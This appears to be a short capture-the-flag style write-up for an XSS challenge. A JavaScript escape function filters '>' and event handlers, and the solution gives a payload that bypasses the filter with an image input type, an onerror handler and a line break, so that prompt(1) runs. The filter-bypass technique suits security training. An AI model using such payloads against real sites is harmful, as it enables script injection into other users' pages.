function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}

Solution:-

Suppose, I am thinking it's an image-input. 
We simply set the type to image due to the fact that the type after cannot override the previous one,

Then we can assign a src and then use an error handler:
 
Ans-     "type=image src onerror
          ="prompt(1)                          

Note:- Don't forget to break the line aftrer "onerror".
